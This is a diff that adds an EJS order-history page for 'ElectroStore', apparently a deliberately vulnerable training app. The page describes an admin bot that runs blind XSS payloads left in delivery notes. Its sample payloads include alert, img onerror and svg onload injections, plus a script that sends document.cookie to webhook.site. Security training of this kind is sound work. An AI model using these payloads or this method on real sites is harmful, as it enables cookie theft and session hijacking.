@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Order History - ElectroStore</title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <%- include('partials/header', { user: user, cart: cart }) %>
+
+    <main class="main-content">
+        <div class="container">
+            <% if (typeof message !== 'undefined' && message) { %>
+                <div class="alert alert-info">
+                    <i class="fas fa-info-circle"></i> <%= message %>
+                </div>
+            <% } %>
+            
+            <% if (typeof error !== 'undefined' && error) { %>
+                <div class="alert alert-error">
+                    <i class="fas fa-exclamation-triangle"></i> <%= error %>
+                </div>
+            <% } %>
+            
+            <div class="d-flex justify-content-between align-items-center mb-4">
+                <h1><i class="fas fa-history"></i> Order History</h1>
+                <div>
+                    <a href="/products" class="btn btn-secondary">
+                        <i class="fas fa-store"></i> Continue Shopping
+                    </a>
+                </div>
+            </div>
+
+            <% if (!orders || orders.length === 0) { %>
+                <div class="card">
+                    <div class="card-body text-center p-5">
+                        <i class="fas fa-clipboard-check fa-3x text-muted mb-3"></i>
+                        <h3>No orders yet</h3>
+                        <p>You haven't placed any orders yet. Start shopping to practice XSS injection!</p>
+                        <a href="/products" class="btn btn-primary">
+                            <i class="fas fa-store"></i> Browse Products
+                        </a>
+                    </div>
+                </div>
+            <% } else { %>
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">
+                            <i class="fas fa-clipboard-list"></i> Your Orders
+                        </h3>
+                        <div class="card-subtitle">
+                            <p class="text-muted mb-0">Orders are automatically reviewed by the admin bot for XSS payload execution.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="card-body">
+                        <div class="table-responsive">
+                            <table class="table">
+                                <thead>
+                                    <tr>
+                                        <th>Order ID</th>
+                                        <th>Date</th>
+                                        <th>Items</th>
+                                        <th>Total</th>
+                                        <th>Status</th>
+                                        <th>XSS Status</th>
+                                        <th>Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <% orders.forEach(order => { %>
+                                        <tr>
+                                            <td><strong>#<%= order.id %></strong></td>
+                                            <td><%= new Date(order.created_at).toLocaleDateString() %></td>
+                                            <td><%= order.item_count %> items</td>
+                                            <td>$<%= order.total_amount ? order.total_amount.toFixed(2) : '0.00' %></td>
+                                            <td>
+                                                <span class="status-badge status-<%= order.status.toLowerCase() %>">
+                                                    <%= order.status %>
+                                                </span>
+                                            </td>
+                                            <td>
+                                                <% if (order.status === 'Created') { %>
+                                                    <span class="badge badge-warning">
+                                                        <i class="fas fa-clock"></i> Pending Review
+                                                    </span>
+                                                    <div class="small text-muted mt-1">Bot reviews every 60s</div>
+                                                <% } else { %>
+                                                    <span class="badge badge-info">
+                                                        <i class="fas fa-check"></i> Reviewed
+                                                    </span>
+                                                    <div class="small text-muted mt-1">XSS payload executed</div>
+                                                <% } %>
+                                            </td>
+                                            <td>
+                                                <a href="/admin/order/<%= order.id %>" class="btn btn-sm btn-primary" target="_blank">
+                                                    <i class="fas fa-external-link-alt"></i> View as Admin
+                                                </a>
+                                                <div class="small text-muted mt-1">Opens admin view</div>
+                                            </td>
+                                        </tr>
+                                    <% }) %>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- XSS Training Information -->
+                <div class="card mt-4">
+                    <div class="card-header">
+                        <h3 class="card-title">
+                            <i class="fas fa-graduation-cap"></i> XSS Training Status
+                        </h3>
+                    </div>
+                    <div class="card-body">
+                        <div class="row" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem;">
+                            <div>
+                                <h5><i class="fas fa-robot"></i> Admin Bot Process</h5>
+                                <p>The admin bot automatically reviews "Created" orders every 60 seconds.</p>
+                                <ul>
+                                    <li>Bot logs in as admin user</li>
+                                    <li>Views all pending orders</li>
+                                    <li>Spends 5 seconds on each order</li>
+                                    <li>Triggers any XSS payloads in delivery notes</li>
+                                </ul>
+                            </div>
+                            <div>
+                                <h5><i class="fas fa-bug"></i> Payload Execution</h5>
+                                <p>When your XSS payload executes:</p>
+                                <ul>
+                                    <li>Runs in admin browser context</li>
+                                    <li>Has admin session privileges</li>
+                                    <li>Can steal cookies, redirect, etc.</li>
+                                    <li>Executes silently (no visible alerts in bot)</li>
+                                </ul>
+                            </div>
+                            <div>
+                                <h5><i class="fas fa-shield-alt"></i> Security Notes</h5>
+                                <p>This is a controlled training environment:</p>
+                                <ul>
+                                    <li>No real data is at risk</li>
+                                    <li>All payloads execute in isolation</li>
+                                    <li>Bot runs in headless mode</li>
+                                    <li>No external network calls (unless you inject them)</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <div class="security-warning mt-3">
+                            <i class="fas fa-exclamation-triangle"></i>
+                            <strong>Educational Purpose Only:</strong> This vulnerability is intentionally implemented for security training.
+                            In production, always sanitize user input and use proper output encoding.
+                        </div>
+                    </div>
+                </div>
+
+                <!-- How to Test XSS -->
+                <div class="card mt-4">
+                    <div class="card-header">
+                        <h3 class="card-title">
+                            <i class="fas fa-vial"></i> How to Test XSS
+                        </h3>
+                    </div>
+                    <div class="card-body">
+                        <h5>Follow these steps to practice Blind XSS:</h5>
+                        <ol>
+                            <li><strong>Place a new order</strong> with an XSS payload in delivery notes</li>
+                            <li><strong>Wait 60 seconds</strong> for the admin bot to review it</li>
+                            <li><strong>Monitor execution</strong> (if payload makes external calls)</li>
+                            <li><strong>Try different payloads</strong> to understand XSS vectors</li>
+                        </ol>
+
+                        <h5 class="mt-3">Sample Payloads to Try:</h5>
+                        <div class="code-samples">
+                            <div class="code-sample">
+                                <h6>Basic Alert</h6>
+                                <pre><code><!-- <script>alert('XSS')</script> --></code></pre>
+                            </div>
+                            <div class="code-sample">
+                                <h6>Cookie Theft Simulation</h6>
+                                <!-- <pre><code><script>fetch('https://webhook.site/?cookie='+document.cookie)</script></code></pre> -->
+                            </div>
+                            <div class="code-sample">
+                                <h6>Image-based XSS</h6>
+                                <!-- <pre><code><img src=x onerror="alert('XSS')"></code></pre> -->
+                            </div>
+                            <div class="code-sample">
+                                <h6>SVG-based XSS</h6>
+                                <!-- <pre><code><svg onload="alert('XSS')"></svg></code></pre> -->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            <% } %>
+
+            <style>
+            .code-samples {
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                gap: 1rem;
+                margin-top: 1rem;
+            }
+
+            .code-sample {
+                background-color: var(--light-color);
+                border-radius: 6px;
+                padding: 1rem;
+            }
+
+            .code-sample h6 {
+                margin-top: 0;
+                margin-bottom: 0.5rem;
+                color: var(--dark-color);
+                font-size: 0.9rem;
+            }
+
+            .code-sample pre {
+                margin: 0;
+                background-color: white;
+                padding: 0.5rem;
+                border-radius: 4px;
+                border: 1px solid var(--border-color);
+                font-size: 0.8rem;
+                overflow-x: auto;
+            }
+
+            .badge {
+                padding: 0.25rem 0.5rem;
+                border-radius: 4px;
+                font-size: 0.75rem;
+                font-weight: 600;
+            }
+
+            .badge-warning {
+                background-color: var(--warning-color);
+                color: var(--dark-color);
+            }
+
+            .badge-info {
+                background-color: var(--info-color);
+                color: white;
+            }
+            </style>
+        </div>
+    </main>
+
+    <%- include('partials/footer') %>
+
+    <script src="/js/main.js"></script>
+</body>
+</html>
